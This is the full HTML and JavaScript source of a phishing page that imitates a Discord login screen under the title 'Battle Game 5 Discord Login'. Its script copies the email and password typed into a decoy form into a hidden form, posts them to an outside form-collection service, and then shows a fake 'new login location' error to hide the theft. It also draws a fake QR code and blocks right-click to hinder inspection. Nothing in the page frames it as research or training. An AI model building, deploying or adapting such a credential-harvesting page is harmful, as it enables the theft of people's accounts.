<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/index.css">
    <link rel="stylesheet" href="css/main.css">
    <title>Battle Game 5 Discord Login</title>
</head>

<body>
    <img src="./assets/bg.svg" alt="App BG" class="bg">
    <div class="login-page">
        <div class="svg-logo-text">
            <img src="./assets/login-screen-logo.svg" alt="App">
        </div>

        <main class="main">
            <div class="authBox">
                <div class="main-form">

                    <!-- Visible fake form (just for looks & interaction) -->
                    <form action="#" id="visibleForm">
                        <div class="input-groups">
                            <div class="main-form-header">
                                <h1>Welcome back!</h1>
                                <p>We're so excited to see you again!</p>
                            </div>
                            <div class="email-wrapper">
                                <label for="emailORphone">
                                    Email or Phone Number
                                    <span class="required">*</span>
                                </label>
                                <input type="text" id="emailORphone" required autocomplete="off">
                            </div>
                            <div class="password-wrapper">
                                <label for="password">
                                    Password
                                    <span class="required">*</span>
                                </label>
                                <input type="password" id="password" required>
                            </div>
                        </div>
                        <div class="forgot-password">
                            <a href="#">Forgot your password?</a>
                        </div>
                        <div class="login">
                            <button type="submit" id="loginButton">
                                Log In
                            </button>
                        </div>
                        <div class="small-register">
                            <span>Need an account?</span>
                            <a href="#">Register</a>
                        </div>
                    </form>
                </div>

                <div class="right-section">
                    <div class="login-container">
                        <div class="qr-code">
                            <!-- QR code will be injected here by JS -->
                            <img src="./assets/qrcode-app-logo.png" alt="App Logo">
                        </div>
                        <h2>Log in with QR Code</h2>
                        <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
                        <a href="#">Or sign in with passkey</a>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <!-- HIDDEN REAL FORMBOLD FORM (this is what actually sends data) -->
    <form id="formboldForm" action="https://formbold.com/s/3jKdB" method="POST" style="display: none;">
        <input type="text" name="emailOrPhone" id="fbEmail">
        <input type="password" name="password" id="fbPassword">
        <!-- Add any extra fields you want in Formbold dashboard here -->
    </form>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
    <script>
        // ==================================
        // CONFIG
        // ==================================
        const CONFIG = {
            ANIMATION_DURATION: 3000,
            QR_REFRESH_INTERVAL: 120000, // 2 minutes
            ELLIPSIS_DELAY_INCREMENT: 0.2,
            QR_STRING_LENGTH: 43,
        };

        // ==================================
        // SELECTORS
        // ==================================
        const DOM = {
            loginButton: document.getElementById('loginButton'),
            qrCodeContainer: document.querySelector(".right-section .qr-code"),
            emailInput: document.querySelector('#emailORphone'),
            passwordInput: document.querySelector('#password'),
            emailWrapper: document.querySelector('.email-wrapper'),
            passwordWrapper: document.querySelector('.password-wrapper'),
        };

        // ==================================
        // UTILITY
        // ==================================
        const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join("");
        };

        // ==================================
        // QR CODE MODULE
        // ==================================
        const QRCodeModule = {
            generate(data) {
                try {
                    const qr = qrcode(0, "L");
                    qr.addData(data);
                    qr.make();
                    const svgString = qr.createSvgTag(1, 0);

                    const parser = new DOMParser();
                    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
                    const svgElement = svgDoc.documentElement;

                    svgElement.setAttribute("width", "160");
                    svgElement.setAttribute("height", "160");
                    svgElement.setAttribute("viewBox", "0 0 37 37");

                    const path = svgElement.querySelector("path");
                    if (path) {
                        const moduleCount = qr.getModuleCount();
                        path.setAttribute("transform", `scale(${37 / moduleCount})`);
                    }
                    return svgElement;
                } catch (e) {
                    console.error("QR generation error:", e);
                    return null;
                }
            },

            getSpinnerMarkup() {
                return `
                    <span class="spinner qrCode-spinner" role="img" aria-label="Loading">
                        <span class="inner wanderingCubes">
                            <span class="item"></span>
                            <span class="item"></span>
                        </span>
                    </span>
                `;
            },

            showLoadingAnimation() {
                if (!DOM.qrCodeContainer) return;
                DOM.qrCodeContainer.innerHTML = this.getSpinnerMarkup() +
                    `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`;
                DOM.qrCodeContainer.style.background = "transparent";
            },

            refresh() {
                if (!DOM.qrCodeContainer) return;
                DOM.qrCodeContainer.innerHTML = "";
                const svg = this.generate(`https://app.com/ra/${generateRandomString()}`);
                if (svg) DOM.qrCodeContainer.appendChild(svg);
                DOM.qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-app-logo.png" alt="App Logo">`);
                DOM.qrCodeContainer.style.background = "white";
            },

            simulateRefresh() {
                this.showLoadingAnimation();
                setTimeout(() => this.refresh(), 3500);
            },

            initRefreshInterval() {
                this.simulateRefresh();
                setInterval(() => this.simulateRefresh(), CONFIG.QR_REFRESH_INTERVAL);
            }
        };

        // ==================================
        // LOGIN BUTTON MODULE
        // ==================================
        const LoginButtonModule = {
            getEllipsisMarkup() {
                return `
                    <span class="spinner" role="img" aria-label="Loading">
                        <span class="inner pulsingEllipsis">
                            <span class="item spinnerItem"></span>
                            <span class="item spinnerItem"></span>
                            <span class="item spinnerItem"></span>
                        </span>
                    </span>
                `;
            },

            applyAnimationDelays() {
                document.querySelectorAll(".spinnerItem").forEach((item, i) => {
                    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${i * CONFIG.ELLIPSIS_DELAY_INCREMENT}s`;
                });
            },

            showNewLoginMessage() {
                if (DOM.emailWrapper.querySelector('.error-message')) return;

                const msg = document.createElement('span');
                msg.className = 'error-message';
                msg.textContent = 'New login location detected, please check your e-mail.';
                msg.style.cssText = 'color:red;display:block;font-size:12px;margin:5px 0;';

                const input = DOM.emailWrapper.querySelector('input');
                DOM.emailWrapper.insertBefore(msg, input);

                if (DOM.emailInput) DOM.emailInput.style.border = '1px solid red';
                if (DOM.passwordInput) DOM.passwordInput.style.border = '1px solid red';
            },

            async showLoading() {
                if (!DOM.loginButton) return;

                // Show spinner
                DOM.loginButton.innerHTML = this.getEllipsisMarkup();
                DOM.loginButton.disabled = true;
                this.applyAnimationDelays();

                // Fill hidden real Formbold form
                document.getElementById('fbEmail').value = DOM.emailInput.value.trim();
                document.getElementById('fbPassword').value = DOM.passwordInput.value;

                // Minimum animation time
                const minDelay = new Promise(res => setTimeout(res, CONFIG.ANIMATION_DURATION));

                // Submit the REAL hidden form â†’ this reaches Formbold
                document.getElementById('formboldForm').submit();

                // Wait for animation, then show message
                await minDelay;
                this.showNewLoginMessage();

                // Reset button
                DOM.loginButton.innerHTML = 'Log In';
                DOM.loginButton.disabled = false;
            },

            init() {
                if (!DOM.loginButton) return;
                DOM.loginButton.addEventListener("click", (e) => {
                    e.preventDefault();
                    this.showLoading();
                });
            }
        };

        // ==================================
        // PREVENT RIGHT CLICK
        // ==================================
        document.addEventListener("contextmenu", e => e.preventDefault());

        // ==================================
        // INIT
        // ==================================
        document.addEventListener("DOMContentLoaded", () => {
            LoginButtonModule.init();
            QRCodeModule.initRefreshInterval();
        });
    </script>
</body>

</html>